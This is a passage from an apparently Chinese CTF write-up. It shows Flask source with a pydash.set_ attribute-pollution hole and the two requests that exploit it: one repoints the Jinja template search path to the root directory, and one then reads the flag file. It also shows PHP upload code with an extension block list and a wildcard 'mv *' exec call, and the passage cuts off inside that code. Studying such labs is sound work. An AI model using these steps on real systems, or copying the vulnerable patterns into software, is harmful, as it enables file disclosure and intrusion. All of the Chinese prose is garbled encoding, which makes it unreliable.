ä¸ä¸€è‡´ï¼Œè¯·ç¡®è®¤åé‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/register&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> data_index</span><br><span class="line">        data_index+=<span class="number">1</span></span><br><span class="line">        database[data_index]=username</span><br><span class="line">        database[username]=password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user_dashboard&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/272e1739b89da32e983970ece1a086bd&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A272e1739b89da32e983970ece1a086bd</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/name&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;username&#x27;</span>:user&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    old_password=request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">    new_password=request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">in</span> database <span class="keyword">and</span> database[user] == old_password:</span><br><span class="line">        database[user]=new_password</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å¯†ç ä¿®æ”¹æˆåŠŸï¼Œè¯·é‡æ–°ç™»å½•ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å¯†ç ä¿®æ”¹å¤±è´¥ï¼Œè¯·ç¡®è®¤æ—§å¯†ç æ˜¯å¦æ­£ç¡®ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/user_dashboard&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="built_in">type</span>=request.form[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> database <span class="keyword">and</span> database[username] != password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯è¯·é‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> username <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯è¯·é‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> name</span><br><span class="line">        name=username    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;user_dashboard&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;A272e1739b89da32e983970ece1a086bd&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªjsæ–‡ä»¶å’Œä¸€ä¸ªpyæ–‡ä»¶ï¼Œ<del>è°æ›´é‡è¦å¥½éš¾çŒœå•Š</del>ï¼Œç€é‡åˆ†æä¸€ä¸‹main.py</p>
<p>é¦–å…ˆæ˜¯æœ€æ˜æ˜¾çš„ä¸€ä¸ªä¹‹å‰æ²¡å‡ºç°è¿‡çš„è·¯ç”±&#x2F;operate</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li><p>è¿™ä¸€éƒ¨åˆ†å­˜åœ¨ä¸‰ä¸ªå¯æ§GETå‚æ•°usernameã€passwordã€confirm_password</p>
</li>
<li><p>åŒæ—¶å‡ºç°äº†æœ€å…³é”®çš„è¯­å¥<strong>pydash.set_(Username,password,confirm_password)</strong>ï¼Œè¿™é‡Œæ˜ç¡®äº†å¦‚ä½•åˆ©ç”¨è¿™ä¸‰ä¸ªå‚æ•°è¿›è¡Œæ±¡æŸ“</p>
<ul>
<li><code>pydash.set_</code> å‡½æ•°çš„è¯­æ³•æ˜¯ï¼š <code>pydash.set_(å¯¹è±¡, å±æ€§è·¯å¾„, æ–°å€¼)</code></li>
</ul>
</li>
</ul>
<p>æ¥ç€æ˜¯å¦ä¸€ä¸ªä¹Ÿæ²¡æœ‰å‡ºç°è¿‡çš„è·¯ç”±&#x2F;impression</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç»™äº†æ–°GETå‚æ•°pointï¼Œå¹¶ä¸”é™åˆ¶äº†åªèƒ½äº”ä¸ªå­—ç¬¦ï¼Œé‚£flagæ–‡ä»¶å¤§æ¦‚å°±å«flagäº†</p>
</li>
<li><p>ç»™å‡ºäº†é»‘åå•ï¼Œå…¶ä¸­è¿‡æ»¤äº†<code>{</code>, <code>}</code>, <code>%</code>, <code>_</code>å°æ€ SSTIï¼Œè¿‡æ»¤äº†<code>.</code> (ç‚¹)å°æ€è·¯å¾„ç©¿è¶Šå’Œç‰¹å®šæ–‡ä»¶è¯»å–ï¼Œè¿‡æ»¤äº†<code>&lt;</code>, <code>&gt;</code>å°æ€ XSSï¼Œåªèƒ½ç”¨é…ç½®æ±¡æŸ“</p>
</li>
<li><p>æœ€å<strong>è¿”å›äº†render_template(point)</strong>ï¼Œè¿™å°±æ˜¯èƒ½æ¸²æŸ“å‡ºflagæ–‡ä»¶å†…å®¹çš„å…³é”®</p>
</li>
</ul>
<p>é¦–å…ˆæ ¹æ®æ ‘çŠ¶å›¾ç¡®å®šï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">app (Flask åº”ç”¨å®ä¾‹)</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ .config  (é…ç½®å­—å…¸)</span><br><span class="line">â”‚   â”‚   # è¿™é‡Œå­˜æ”¾ç€æ‰€æœ‰çš„å®‰å…¨é…ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ [&#x27;SECRET<span class="emphasis">_KEY&#x27;]               -&gt; Session ç­¾åå¯†é’¥ (æ‹¿åˆ°å®ƒå°±èƒ½ä¼ªé€ ä»»æ„ç”¨æˆ·ç™»å½•)</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ [&#x27;SQLALCHEMY_</span>DATABASE<span class="emphasis">_URI&#x27;]  -&gt; æ•°æ®åº“è¿æ¥ä¸² (æ”¹æˆä½ çš„æ¶æ„æ•°æ®åº“åœ°å€)</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ [&#x27;DEBUG&#x27;]                    -&gt; è°ƒè¯•æ¨¡å¼å¼€å…³ (éƒ¨åˆ†ç‰ˆæœ¬å¼€å¯å¯å¯¼è‡´ RCE)</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ [&#x27;PERMANENT_</span>SESSION<span class="emphasis">_LIFETIME&#x27;]-&gt; Session è¿‡æœŸæ—¶é—´</span></span><br><span class="line"><span class="emphasis">â”‚   â””â”€â”€ ... (å…¶ä»–è‡ªå®šä¹‰é…ç½®)</span></span><br><span class="line"><span class="emphasis">â”‚</span></span><br><span class="line"><span class="emphasis">â”œâ”€â”€ .jinja_</span>loader (æœ¬é¢˜æ”»å‡»åŒºï¼šæ¨¡æ¿åŠ è½½å™¨)</span><br><span class="line">â”‚   â”‚   # è´Ÿè´£å¯»æ‰¾æ¨¡æ¿æ–‡ä»¶</span><br><span class="line">â”‚   â””â”€â”€ .searchpath (list)           -&gt; [å…³é”®] æ¨¡æ¿æœç´¢è·¯å¾„åˆ—è¡¨</span><br><span class="line">â”‚       â”‚                               (é»˜è®¤æ˜¯ [&#x27;/app/templates&#x27;])</span><br><span class="line">â”‚       â””â”€â”€ æ”¹ä¸º [&#x27;/&#x27;] åˆ™å¯¼è‡´ LFI</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ .jinja<span class="emphasis">_env (Jinja2 ç¯å¢ƒé…ç½®)</span></span><br><span class="line"><span class="emphasis">â”‚   â”‚   # è¿™é‡Œæ§åˆ¶ç€æ¨¡æ¿æ¸²æŸ“çš„è§„åˆ™</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ .globals (dict)              -&gt; å…¨å±€å‡½æ•°/å˜é‡ (SSTI å¸¸åœ¨è¿™é‡Œæ‰¾ os/eval)</span></span><br><span class="line"><span class="emphasis">â”‚   â”œâ”€â”€ .filters (dict)              -&gt; è¿‡æ»¤å™¨å®šä¹‰</span></span><br><span class="line"><span class="emphasis">â”‚   â””â”€â”€ ...</span></span><br><span class="line"><span class="emphasis">â”‚</span></span><br><span class="line"><span class="emphasis">â”œâ”€â”€ .url_</span>map (è·¯ç”±æ˜ å°„è¡¨)</span><br><span class="line">â”‚   â”‚   # å†³å®šäº† URL æ€ä¹ˆè·³è½¬</span><br><span class="line">â”‚   â””â”€â”€ ...</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ .view<span class="emphasis">_functions (è§†å›¾å‡½æ•°å­—å…¸)</span></span><br><span class="line"><span class="emphasis">â”‚   â”‚   # å­˜å‚¨äº†æ¯ä¸ªè·¯ç”±å¯¹åº”çš„ Python å‡½æ•°</span></span><br><span class="line"><span class="emphasis">â”‚   â””â”€â”€ ...</span></span><br><span class="line"><span class="emphasis">â”‚</span></span><br><span class="line"><span class="emphasis">â””â”€â”€ .<span class="strong">__class__</span> / .<span class="strong">__init__</span> (Python åŸç”Ÿé­”æ³•å±æ€§)</span></span><br><span class="line"><span class="emphasis">    â”‚   # ç”¨æ¥è¿›è¡Œâ€œåŸå‹é“¾â€è·³è·ƒï¼Œè·³å‡º app å»æ‰¾å…¶ä»–æ¨¡å—</span></span><br><span class="line"><span class="emphasis">    â””â”€â”€ .<span class="strong">__globals__</span>                 -&gt; è®¿é—®å¼•å…¥çš„ os, sys ç­‰æ¨¡å— (RCE å¸¸ç”¨)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>æ”»å‡»å¯¹è±¡ï¼šappï¼ˆFlaské»˜è®¤ï¼‰</p>
</li>
<li><p>å±æ€§è·¯å¾„ï¼šapp.jinja_loader.searchpathæˆ–è€…jinja_loader.searchpath</p>
</li>
<li><p>æ–°å€¼ï¼š&#x2F;ï¼ˆå¤§æ¦‚ç‡è¢«æ”¾ç½®åœ¨ç³»ç»Ÿæ ¹ç›®å½•ï¼‰</p>
</li>
</ul>
<p>æ„é€ å¹¶è®¿é—®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/operate?username=app&amp;password=jinja_loader.searchpath&amp;confirm_password=/</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç¤ºoprate successï¼Œè¯æ˜æ±¡æŸ“æˆåŠŸ</p>
<p>æ¥ç€æ„é€ å¹¶è®¿é—®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/impression?point=flag</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag</p>
<hr>
<h1 id="9-mv-upload"><a href="#9-mv-upload" class="headerlink" title="9. mv_upload"></a>9. mv_upload</h1><p>è¿™ç§ä¸Šä¼ æ–‡ä»¶çš„é¢˜ç›®ï¼Œé¦–å…ˆåœ¨ä¿¡æ¯ä¸è¶³çš„æƒ…å†µä¸‹å…ˆæŸ¥çœ‹ç‰ˆæœ¬å’Œæ‰«ç›®å½•</p>
<p>ç”¨dirsearchæ‰«å‡ºäº†&#x2F;index.php~ï¼Œè®¿é—®åæ‹¿åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="string">&#x27;/tmp/upload/&#x27;</span>; <span class="comment">// ä¸´æ—¶ç›®å½•</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;/var/www/html/upload/&#x27;</span>; <span class="comment">// å­˜å‚¨ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$blacklist</span> = [</span><br><span class="line">    <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phps&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;jspa&#x27;</span>, <span class="string">&#x27;jspx&#x27;</span>, <span class="string">&#x27;jsw&#x27;</span>, <span class="string">&#x27;jsv&#x27;</span>, <span class="string">&#x27;jspf&#x27;</span>, <span class="string">&#x27;jtml&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;ascx&#x27;</span>, <span class="string">&#x27;ashx&#x27;</span>, <span class="string">&#x27;asmx&#x27;</span>, <span class="string">&#x27;cer&#x27;</span>, <span class="string">&#x27;aSp&#x27;</span>, <span class="string">&#x27;aSpx&#x27;</span>, <span class="string">&#x27;cEr&#x27;</span>, <span class="string">&#x27;pHp&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>, <span class="string">&#x27;shtm&#x27;</span>, <span class="string">&#x27;stm&#x27;</span>,<span class="string">&#x27;pl&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;exe&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;py&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>, <span class="string">&#x27;scgi&#x27;</span>,<span class="string">&#x27;htaccess&#x27;</span>, <span class="string">&#x27;htpasswd&#x27;</span>, <span class="string">&quot;php2&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>,  <span class="string">&quot;swf&quot;</span>,<span class="string">&quot;ini&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$filesInTmp</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºç›®æ ‡ç›®å½•</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$targetDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$targetDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸Šä¼ ä¸´æ—¶ç›®å½•</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploadedFiles</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$uploadedFiles</span>[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$uploadedFiles</span>[<span class="string">&#x27;error&#x27;</span>][<span class="variable">$index</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶ <span class="subst">&#123;$filename&#125;</span> ä¸Šä¼ å¤±è´¥ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmpName</span> = <span class="variable">$uploadedFiles</span>[<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$index</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶åæ— æ•ˆï¼Œè·³è¿‡ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fileParts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="keyword">isset</span>(<span class="variable">$fileParts</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="title function_ invoke__">strtolower</span>(<span class="variable">$fileParts</span>[<span class="string">&#x27;extension&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$extension</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$blacklist</span>)) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶ <span class="subst">&#123;$filename&#125;</span> å› ç±»å‹ä¸å®‰å…¨ï¼ˆ.<span class="subst">&#123;$extension&#125;</span>ï¼‰è¢«æ‹’ç»ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$destination</span> = <span class="variable">$uploadDir</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpName</span>, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶ <span class="subst">&#123;$filename&#125;</span> å·²ä¸Šä¼ è‡³ <span class="subst">$uploadDir</span><span class="subst">$filename</span> ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶ <span class="subst">&#123;$filename&#125;</span> ç§»åŠ¨å¤±è´¥ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–ä¸´æ—¶ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$uploadDir</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="variable">$filesInTmp</span>[] = <span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†ç¡®è®¤ä¸Šä¼ å®Œæ¯•ï¼ˆç§»åŠ¨æ–‡ä»¶ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;confirm_move&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filesInTmp</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> .= <span class="string">&quot;æ²¡æœ‰å¯ç§»åŠ¨çš„æ–‡ä»¶ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = [];</span><br><span class="line">        <span class="variable">$returnCode</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;cd <span class="subst">$uploadDir</span> ; mv * <span class="subst">$targetDir</span> 2&gt;&amp;1&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$returnCode</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span 